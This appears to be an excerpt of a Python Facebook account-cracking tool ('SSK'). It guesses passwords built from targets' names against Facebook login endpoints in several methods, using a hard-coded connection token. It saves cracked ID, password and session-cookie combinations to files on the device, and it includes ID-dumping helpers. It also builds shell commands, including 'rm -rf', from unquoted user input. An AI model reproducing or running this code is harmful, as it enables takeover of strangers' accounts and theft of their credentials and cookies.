...
from concurrent.futures import ThreadPoolExecutor as ahsan
from string import * 
...
\033[1;37m------------------------------------------------
\033[1;37m Owner   :            Suresh kumar
\033[1;37m Facebook:            none
\033[1;37m Github  :            Suresh-slove
...
def result(OKs,cps):
    if len(OKs) != 0 or len(cps) != 0:
        ...
        print(47*'-')
        input("Press enter to back SSK Menu ")
        exit()
...
class main_crack():
    ...
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[SSK] {loop} | M1 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r{R} [SSK-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/SSK_OK_ids_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/SSB_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     #print(f"\r{A} [SB-CP] {sid} | {ps} {S}")
                     cps.append(sid)
                     open('/sdcard/SSK_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
    ...
    def methodC(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[SK] {loop} | M3 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    oks.append(sid)
                    open('/sdcard/SSB_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/SB_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    #  print(f"\r{A} [SB-CP] {sid} | {ps} {S}")
                    cps.append(sid)
                    open('/sdcard/SB_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
    ...
    def methodD(self, sid, name, psw):
        global oks,cps,loop
        sys.stdout.write(f"\r {S}[SB] {loop} | M4 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
        sys.stdout.flush()
        fs = name.split(' ')[0]
        try:
            ls = name.split(' ')[1]
        ...
        try:
            for pw in psw:
                ...
                if 'c_user' in session.cookies.get_dict():
                    print(f"\r{R} [SB-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/SB_OK.txt','a').write(sid+'|'+ps+'\n')
                    break
...
def follower():
    ...
    try:
        ...
        try:
            ...
            menu()
        print(f'File Name To Dump Ids. Example /sdcard/SB.txt') 
        print(47*"-")
        filepath = input("Put File Name: ")
        os.system('rm -rf %s'%(filepath))
        clear()
...
def sids():
    ...
    clear()
    print('\033[1;37mExample: /sdcard/SB.txt\033[0;97m')
    print(47*'-')
...
def p_dump():
    ...
    try:
        ...
        srange = int(input('How many IDs do you want to add?: ' ))
        clear()
        print(f'{S}File Name To Dump Ids. Example /sdcard/SB.txt\n') 
        filepath = input("Put File Name: ")
        ...
        print(f"File Saved To  {filepath} ")
        print(47*'-')
        input("Press enter to back SB Menu ")
        SSB(allkey)
    except Exception as e:
        print("Error : %s"%e) 
...
def cutter():
    ...
    print(" ")
    sarfraz = input('Saving Put File Name:')
    os.system('touch ' +HABIB)
    os.system('sort -r '+sb+' | uniq > '+HABIB)
    os.system('clear')
    print(logo)
    print("Removed Successful From File: " + sb )
